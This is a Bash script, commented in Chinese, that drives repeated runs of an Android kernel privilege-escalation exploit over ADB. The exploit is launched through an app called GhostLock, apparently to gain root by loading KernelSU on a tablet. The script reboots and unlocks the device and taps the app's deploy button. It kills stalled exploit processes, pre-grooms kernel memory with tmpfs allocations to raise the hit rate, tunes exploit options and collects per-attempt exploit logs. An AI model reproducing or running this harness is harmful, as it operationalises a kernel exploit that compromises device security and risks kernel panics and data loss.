#!/bin/bash
# =============================================================================
# app_root_v2.sh — 基于 app_root.sh（2026-10-15 增强版，配方不变）
#
# 相对 v1 的三处增强（默认行为与 v1 完全一致，仅下列改动）：
#   1) 逐发指标采集：每次开火结束立即 pull 本次 dc_ksu.log 存档（dcshot_*.log），
#      并把「kernel page prepare / exploit attempt」行打进运行日志 —— 得到每发
#      的“页准备命中次数 prep_tries”（无需 root 的内存状态探针）。
#      命中时额外拉黄金样本全套（dc_ksu/cp/cfi_state/walk_state/ph_all）。
#   2) 修废发：找不到「一键部署执行」按钮时，force-stop 重启 GhostLock App 再重试
#      （v1 只试一次就放弃，白烧一个同 boot 槽位；历史日志有 5 例）。
#   3) 实验开关（默认关，不改默认配方）：
#        GROOM_MB=1600     开火前用户态碎片整理：dd N MB 到 /tmp(tmpfs 纯内存) →
#                          删除 → 等 15s 沉降（不碰闪存、不需要 root）。
#                          GROOM_EVERY=1 时每发前都整理（默认只第 1 发）。
#        EXP_ATTEMPTS=2    写入 OPTS EXPLOIT_ATTEMPTS=n（页准备狩猎上限实验）
#
# 用法：  bash app_root_v2.sh go    （其余同 v1）
# =============================================================================
set -u
export MSYS_NO_PATHCONV=1 MSYS2_ARG_CONV_EXCL='*'

ADB="/c/Users/user/AppData/Local/Microsoft/WinGet/Packages/Google.PlatformTools_Microsoft.Winget.Source_8wekyb3d8bbwe/platform-tools/adb"
PY="C:/Users/user/.workbuddy/binaries/python/envs/default/Scripts/python.exe"
LOGDIR="D:/file/文档/workbuddy/2026-10-13-11-14-12/auto_root_logs"
GHOSTLOCK_PKG="com.ghostlock.ksu"
SHIZUKU_PKG="moe.shizuku.privileged.api"
SHIZUKU_STARTER="/data/app/~~BaK86ZMC8N7EQlfmE7Gxpw==/moe.shizuku.privileged.api-MpB5OyMJgjXfHVbWq5dgpw==/lib/arm64/libshizuku.so"
MAX_BOOTS="${MAX_BOOTS:-15}"
ABNORMAL_MAX="${ABNORMAL_MAX:-3}"
SHOTS_PER_BOOT="${SHOTS_PER_BOOT:-3}"
UPTIME_GATE="${UPTIME_GATE:-30}"
FIRE_TIMEOUT=900
MODE="${1:-dry}"

# ---- 实验开关（默认 0 = 与 v1 行为一致）----
GROOM_MB="${GROOM_MB:-0}"
GROOM_EVERY="${GROOM_EVERY:-0}"
EXP_ATTEMPTS="${EXP_ATTEMPTS:-}"
EVEN_ONLY="${EVEN_ONLY:-}"
EXTRA_OPTS="${EXTRA_OPTS:-}"

mkdir -p "$LOGDIR"
LOG="$LOGDIR/app_root_$(date +%m%d_%H%M%S).log"
log(){ echo "[$(date '+%H:%M:%S')] $*" | tee -a "$LOG"; }
q(){ timeout 20 "$ADB" shell "$@" </dev/null 2>/dev/null; }

# ---------- 设备检查 ----------
check_device(){
  local st; st=$(timeout 10 "$ADB" get-state 2>/dev/null)
  [ "$st" != "device" ] && { log "✗ 设备未连接 (state=$st)"; return 1; }
  log "设备在线: $(q "getprop ro.product.model") | $(q "getprop ro.build.display.id")"
  return 0
}

# ---------- 等 boot 完成 ----------
wait_boot(){
  local i=0 st
  while [ $i -lt 96 ]; do
    st=$(timeout 10 "$ADB" get-state 2>/dev/null)
    if [ "$st" = "device" ]; then
      [ "$(q "getprop sys.boot_completed")" = "1" ] && return 0
    else
      [ $((i % 6)) -eq 0 ] && log "⚠ 等待设备枚举中...（state=${st:-none}）"
    fi
    sleep 5; i=$((i+1))
  done
  log "✗ 8 分钟未等到设备完成开机"; return 1
}

wait_uptime(){
  local i=0 up
  while [ $i -lt 60 ]; do
    up=$(q "cut -d. -f1 /proc/uptime")
    [ -n "$up" ] && [ "$up" -ge "$UPTIME_GATE" ] && { log "uptime=${up}s 沉降完成"; return 0; }
    sleep 3; i=$((i+1))
  done
  log "✗ 等沉降超时"; return 1
}

# ---------- 关闭荣耀「USB 连接方式」系统弹框 ----------
dismiss_usb_dialog(){
  q "uiautomator dump /sdcard/usbdlg.xml" >/dev/null 2>&1
  timeout 30 "$ADB" pull /sdcard/usbdlg.xml "$LOGDIR/usbdlg.xml" >/dev/null 2>&1
  [ -f "$LOGDIR/usbdlg.xml" ] || return 1
  local hit
  hit=$("$PY" - "$LOGDIR/usbdlg.xml" <<'PYEOF'
import re, sys
try:
    xml = open(sys.argv[1], encoding='utf-8', errors='ignore').read()
except Exception:
    sys.exit()
if ('USB' not in xml) or ('仅充电' not in xml):
    sys.exit()
for m in re.finditer(r'text="([^"]*)"[^>]*bounds="\[(\d+),(\d+)\]\[(\d+),(\d+)\]"', xml):
    t = m.group(1)
    if t in ('传输文件', '文件传输'):
        x = (int(m.group(2)) + int(m.group(4))) // 2
        y = (int(m.group(3)) + int(m.group(5))) // 2
        print("%d %d" % (x, y))
        break
PYEOF
)
  if [ -n "$hit" ]; then
    q "input tap $hit" >/dev/null 2>&1
    log "⚠ 检测到 USB 连接方式弹框 → 已点「传输文件」关闭（顺带切到 MTP）"
    sleep 2
    return 0
  fi
  return 1
}

wake_and_unlock(){
  q "input keyevent KEYCODE_WAKEUP" >/dev/null
  sleep 1
  q "wm dismiss-keyguard" >/dev/null
  sleep 1
  q "input swipe 1524 1900 1524 300 300" >/dev/null 2>&1
  sleep 1
  q "input keyevent 82" >/dev/null
  sleep 1
  q "wm dismiss-keyguard" >/dev/null 2>&1
  dismiss_usb_dialog
  q "settings put system usb_cancel_mtp_dialog 1" >/dev/null 2>&1
  q "svc power stayon usb" >/dev/null
  log "已唤醒/上滑解锁并保持屏幕常亮（已关 USB 弹框并重设免弹窗）"
}

quieten(){
  q "am force-stop com.ss.android.yumme.video" >/dev/null
  q "am force-stop com.tencent.mm" >/dev/null
  log "已清后台高负载应用"
}

# ---------- [v2-实验] 用户态碎片整理：tmpfs 大块分配后释放，促使 buddy 合并 ----------
# 机理：/tmp 是 tmpfs（纯 RAM，不写闪存）。先大块占用（顺带逼内核回收 file cache，
# 解除这些页对伙伴合并的阻塞），再整体释放 → 空闲页大面积成对归并，order-N 大块回升。
# 证据基线：root 下 compact 后 order-3 由 1→3524 时全链 25 秒成功（n=2）。
groom_memory(){
  [ "$GROOM_MB" -le 0 ] && return 0
  local avail n
  avail=$(q "awk '/MemAvailable/{print int(\$2/1024)}' /proc/meminfo")
  case "$avail" in ''|*[!0-9]*) log "⚠ 整理跳过（MemAvailable 读取失败）"; return 0;; esac
  n=$((GROOM_MB))
  [ $((avail - 700)) -lt $n ] && n=$((avail - 700))
  [ "$n" -lt 200 ] && { log "⚠ 整理跳过（可用内存过低 avail=${avail}MB）"; return 0; }
  log "碎片整理：dd ${n}MB → /tmp（tmpfs 纯内存）…"
  q "dd if=/dev/zero of=/tmp/groom.bin bs=1M count=$n" >/dev/null 2>&1
  q "rm -f /tmp/groom.bin" >/dev/null 2>&1
  log "碎片整理：已释放，等 15s 让分配器沉降/合并"
  sleep 15
}

start_shizuku(){
  if q "ps -A -o NAME 2>/dev/null" | grep -q shizuku_server; then
    log "✓ Shizuku server 已在运行"
    return 0
  fi
  if q "test -f $SHIZUKU_STARTER"; then
    q "$SHIZUKU_STARTER" >/dev/null 2>&1
    sleep 3
  else
    local apk so
    apk=$(q "pm path $SHIZUKU_PKG" 2>/dev/null | head -1 | cut -d: -f2)
    so="${apk%/base.apk}/lib/arm64/libshizuku.so"
    if [ -n "$so" ] && q "test -f $so"; then
      log "固定 starter 缺失，改用动态路径: $so"
      q "$so" >/dev/null 2>&1
      sleep 3
    else
      log "✗ 找不到 libshizuku.so"
      return 1
    fi
  fi
  if q "ps -A -o NAME 2>/dev/null" | grep -q shizuku_server; then
    log "✓ Shizuku 已授权就绪"
    return 0
  fi
  log "⚠ Shizuku 未确认启动"
  return 1
}

# ---------- 解析「一键部署执行」按钮坐标 ----------
find_btn(){
  q "uiautomator dump /sdcard/gh.xml" >/dev/null 2>&1
  timeout 30 "$ADB" pull /sdcard/gh.xml "$LOGDIR/gh.xml" >/dev/null 2>&1
  "$PY" - "$LOGDIR/gh.xml" <<'EOF'
import re, sys
xml = open(sys.argv[1], encoding='utf-8').read()
for m in re.finditer(r'text="一键部署执行"[^>]*bounds="\[(\d+),(\d+)\]\[(\d+),(\d+)\]"', xml):
    x = (int(m.group(1)) + int(m.group(3))) // 2
    y = (int(m.group(2)) + int(m.group(4))) // 2
    print(f"{x} {y}")
    break
EOF
}

KIT_DIR="/data/local/tmp/ksu_app"
LINK="/data/local/tmp/ksu"
ensure_link(){
  if ! q "test -e $LINK"; then
    if q "test -d $KIT_DIR"; then
      q "ln -s $KIT_DIR $LINK" >/dev/null 2>&1
      log "已建立符号链接 $LINK -> $KIT_DIR"
    else
      return 1
    fi
  fi
  return 0
}

# ---------- [v2-指标] 收档本次开火日志并把关键行打进运行日志 ----------
# dc_ksu.log 每发会被下一次启动覆盖 → 必须在检测到 DONE 后立刻 pull。
archive_shot(){
  local tag="$1"
  local ts; ts=$(date +%m%d_%H%M%S)
  local dst="$LOGDIR/dcshot_${ts}_${tag}.log"
  timeout 20 "$ADB" pull "$LINK/dc_ksu.log" "$dst" >/dev/null 2>&1
  if [ -f "$dst" ]; then
    # 页准备狩猎序列 = 每发的内存状态探针（prep_tries）
    grep -aE 'kernel page prepare|prepare_kernel_page retry|exploit attempt=|APP_FOPS_SINGLE_SHOT|pipe physrw|refusing retry|exploit failed after|exploit completed|fops-loop attempt|step=|configfs|write-round|quiet window|dc12 exit' "$dst" >> "$LOG" 2>/dev/null
  fi
  # [v2-诊断] 逐发全诊断存档：cp(写轮次几何,跨发累积→可diff增量)、cfi、ph_all、aff(每发更新)、walk_state
  # 文件缺设备上不存在时 pull 静默失败，不影响主流程；jam 时设备卡死最多各等 10s
  timeout 10 "$ADB" pull "$LINK/cp.log"        "$LOGDIR/dcshot_${ts}_${tag}_cp.log"        >/dev/null 2>&1
  timeout 10 "$ADB" pull "$LINK/cfi_state.log" "$LOGDIR/dcshot_${ts}_${tag}_cfi_state.log" >/dev/null 2>&1
  timeout 10 "$ADB" pull "$LINK/ph_all.log"    "$LOGDIR/dcshot_${ts}_${tag}_ph_all.log"    >/dev/null 2>&1
  timeout 10 "$ADB" pull "$LINK/aff_diag.log"  "$LOGDIR/dcshot_${ts}_${tag}_aff_diag.log"  >/dev/null 2>&1
  timeout 10 "$ADB" pull /data/local/tmp/cga43499_walk_state "$LOGDIR/dcshot_${ts}_${tag}_walk_state" >/dev/null 2>&1
  # 记录设备端诊断文件 mtime，判断本轮是否真的被更新过（ph_all/poison 并非每发更新）
  q "ls -la --time-style=+%H:%M:%S $LINK/cp.log $LINK/cfi_state.log $LINK/ph_all.log $LINK/aff_diag.log 2>/dev/null" >> "$LOG" 2>/dev/null
}

# ---------- [v2-命中] 黄金样本全套收档 ----------
pull_golden(){
  local ts; ts=$(date +%m%d_%H%M%S)
  timeout 20 "$ADB" pull "$LINK/dc_ksu.log"   "$LOGDIR/hit_${ts}_dc_ksu.log"   >/dev/null 2>&1
  timeout 20 "$ADB" pull "$LINK/cp.log"        "$LOGDIR/hit_${ts}_cp.log"        >/dev/null 2>&1
  timeout 20 "$ADB" pull "$LINK/cfi_state.log" "$LOGDIR/hit_${ts}_cfi_state.log" >/dev/null 2>&1
  timeout 20 "$ADB" pull /data/local/tmp/cga43499_walk_state "$LOGDIR/hit_${ts}_walk_state" >/dev/null 2>&1
  timeout 20 "$ADB" pull "$LINK/ph_all.log"    "$LOGDIR/hit_${ts}_ph_all.log"    >/dev/null 2>&1
  log "黄金样本已收档（hit_${ts}_*）"
}

# ---------- App 提权：拉起 App + 点部署 + 盯命中 ----------
app_fire(){
  log "拉起 GhostLock App ..."
  q "monkey -p $GHOSTLOCK_PKG -c android.intent.category.LAUNCHER 1" >/dev/null 2>&1
  sleep 4
  local btn; btn=$(find_btn)
  if [ -z "$btn" ]; then
    log "⚠ 首次未找到「一键部署执行」→ 尝试关闭 USB 弹框后重试"
    dismiss_usb_dialog
    sleep 2
    btn=$(find_btn)
  fi
  # [v2-修废发] 仍找不到 ≈ App 卡在上次结果页/未加载 → force-stop 重启 App 再找
  #（v1 此处直接放弃 = 白烧一个同 boot 槽位，历史日志 5 例）
  if [ -z "$btn" ]; then
    log "⚠ 仍未找到按钮 → 重启 GhostLock App 后重试"
    q "am force-stop $GHOSTLOCK_PKG" >/dev/null 2>&1
    sleep 2
    q "monkey -p $GHOSTLOCK_PKG -c android.intent.category.LAUNCHER 1" >/dev/null 2>&1
    sleep 5
    dismiss_usb_dialog
    btn=$(find_btn)
  fi
  if [ -z "$btn" ]; then
    log "✗ 找不到「一键部署执行」按钮（重启 App 后仍无，本轮作废）"
    return 1
  fi
  local bx by
  bx=${btn% *}; by=${btn#* }
  ensure_link && log "kit 路径已就绪（$LINK）"
  log "点击「一键部署执行」($bx,$by) ..."
  q "input tap $bx $by" >/dev/null 2>&1
  sleep 20
  if ensure_link; then
    if ! q "test -f $LINK/dc_ksu.log -o -f $LINK/run.lock" ; then
      log "⚠ 未见运行痕迹，补点一次「一键部署执行」..."
      q "input tap $bx $by" >/dev/null 2>&1
    fi
  fi
  local i=0 r empty=0 stall=0 lastln=""
  local t0; t0=$(date +%s)
  local elapsed=0
  while [ $i -lt $((FIRE_TIMEOUT / 5 + 20)) ]; do
    r=$(q "if grep -qi kernelsu /proc/modules; then echo HIT; elif grep -q 'dc12 exit=' $LINK/dc_ksu.log 2>/dev/null; then echo DONE; elif [ $elapsed -ge 70 ] && [ -f $LINK/run.lock ] && ! pgrep -f cve-2026-43499 >/dev/null 2>&1; then echo DONE; else echo \"STAT \$(wc -l < $LINK/dc_ksu.log 2>/dev/null) \$(grep -c 'cache gate failed' $LINK/dc_ksu.log 2>/dev/null)\"; fi")
    case "$r" in
      STAT*)
        sline=${r#STAT }; ln=${sline%% *}; cg=${sline##* }
        if [ -n "$cg" ] && [ "$cg" -gt 0 ] 2>/dev/null && [ "$ln" = "$lastln" ] 2>/dev/null; then
          stall=$((stall+1))
          if [ "$stall" -ge 8 ]; then
            log "⚡ gate 失败僵死（40s 无进展）→ 提前击杀 exploit 收轮（吞吐优化）"
            q "for p in \$(pidof cve-2026-43499-bin-dc14-sig); do kill -9 \$p 2>/dev/null; done" >/dev/null 2>&1
            stall=0
          fi
        else
          stall=0
        fi
        lastln=$ln ;;
    esac
    if [ -z "$r" ]; then
      if [ "$(timeout 10 "$ADB" get-state 2>/dev/null)" != "device" ]; then
        empty=$((empty+1))
        if [ "$empty" -ge 10 ]; then
          log "⚠ 设备离线超过 50s（疑似内核 panic 重启中）→ 结束本轮"
          return 1
        fi
      else
        empty=0
      fi
    else
      empty=0
    fi
    case "$r" in
      *HIT*)
        log "★★★ 命中！KernelSU 已加载 ★★★"
        q "id; getenforce; grep -i kernelsu /proc/modules" >> "$LOG" 2>&1
        pull_golden
        archive_shot hit
        return 0 ;;
      *DONE*)
        log "exploit 已自行收尾（本轮 miss，提前重启省 13 分钟）"
        archive_shot miss
        return 1 ;;
    esac
    elapsed=$(( $(date +%s) - t0 ))
    if [ $elapsed -ge 480 ]; then
      log "⚠ 开火 480s 无结论 → 判定内核分配器被残留卡死（整机假死），结束本轮靠重启恢复"
      archive_shot jam
      return 1
    fi
    sleep 5; i=$((i+1))
  done
  log "本 boot 未命中 → miss"
  archive_shot timeout
  return 1
}

# ---------- 主流程 ----------
main(){
  check_device || exit 1
  q "settings put system usb_cancel_mtp_dialog 1" >/dev/null 2>&1
  log "已确保 usb_cancel_mtp_dialog=1（插线免手动选传输文件）"

  if [ "$MODE" != "go" ]; then
    log "dry 模式：单次拉 Shizuku + 点部署（不重启）"
    start_shizuku || true
    app_fire && log "=== ROOT 成功 ===" || log "=== 未命中 ==="
    exit 0
  fi

  log "=== [v2] App 通道自动提权循环开始（上限 $MAX_BOOTS boot × $SHOTS_PER_BOOT 发）==="
  [ "$GROOM_MB" -gt 0 ] && log "实验开关：GROOM_MB=$GROOM_MB GROOM_EVERY=$GROOM_EVERY（开火前用户态碎片整理）"
  [ -n "$EXP_ATTEMPTS" ] && log "实验开关：EXPLOIT_ATTEMPTS=$EXP_ATTEMPTS（写入 OPTS）"
  # OPTS：默认只多连发；实验旋钮经环境变量追加（EVEN_ONLY→SLIDE_FOPS_EVEN_ONLY；EXTRA_OPTS 原样透传）
  local _opts="ALLOW_MULTISHOT=1"
  [ -n "$EXP_ATTEMPTS" ] && _opts="$_opts
EXPLOIT_ATTEMPTS=$EXP_ATTEMPTS"
  [ -n "$EVEN_ONLY" ] && _opts="$_opts
SLIDE_FOPS_EVEN_ONLY=$EVEN_ONLY"
  [ -n "$EXTRA_OPTS" ] && _opts="$_opts
$EXTRA_OPTS"
  q "printf '%s\n' '$_opts' > /data/local/tmp/ksu/OPTS" >/dev/null 2>&1
  q "cat /data/local/tmp/ksu/OPTS" >> "$LOG" 2>&1
  local n=1 abnormal=0 BID BID2 fires=0
  while [ $n -le $MAX_BOOTS ]; do
    if [ "$fires" -eq 0 ]; then
      log "-------- 第 $n/$MAX_BOOTS 轮（boot 内第 1 发）--------"
      log "重启平板..."
      timeout 30 "$ADB" reboot >/dev/null 2>&1 || q "svc power reboot" >/dev/null
      wait_boot || { log "开机等待失败，重试"; continue; }
      wait_uptime || { log "沉降失败，重试"; continue; }
      wake_and_unlock
      quieten
      groom_memory
      BID=$(q "cat /proc/sys/kernel/random/boot_id")
    else
      log "-------- 第 $n/$MAX_BOOTS 轮（同 boot 第 $((fires+1)) 发，免解锁直接开火）--------"
      dismiss_usb_dialog
      [ "$GROOM_EVERY" = "1" ] && groom_memory
    fi
    start_shizuku || log "（Shizuku 未就绪，App 可能提示未授权）"
    fires=$((fires+1))
    if app_fire; then
      log ""
      log "=========== ROOT 成功（App 通道命中）==========="
      log "KernelSU 管理器应显示「工作中」，可给 MT 管理器 / Termux 授权"
      log "完整日志: $LOG"
      exit 0
    fi
    BID2=$(q "cat /proc/sys/kernel/random/boot_id")
    if [ -z "$BID2" ] || [ "$BID2" != "$BID" ]; then
      abnormal=$((abnormal+1))
      if [ -z "$BID2" ]; then
        log "⚠⚠⚠ 开火后设备失联（adb 20s 无响应）→ 判定内核 panic 重启"
      else
        log "⚠⚠⚠ 异常重启：boot_id ${BID:0:8} → ${BID2:0:8}（非脚本触发，即内核 panic）"
      fi
      log "     累计 $abnormal / 熔断阈值 $ABNORMAL_MAX"
      if [ "$abnormal" -ge "$ABNORMAL_MAX" ]; then
        log "✗✗ 熔断触发：连续 $abnormal 次内核 panic，停止提权以免损坏 /data"
        log "     设备已自动重启，可正常使用；如需再试请人工确认后重开"
        exit 3
      fi
      sleep 20
      wait_boot || log "（等设备回来超时）"
      fires=0; n=$((n+1)); continue
    fi
    abnormal=0
    if [ "$fires" -ge "$SHOTS_PER_BOOT" ]; then
      log "本 boot 已连开 $fires 发 → 重启换下一 boot"
      fires=0; n=$((n+1)); continue
    fi
  done
  log "✗ $MAX_BOOTS 个 boot 未命中。检查 $LOG"
  exit 2
}

main
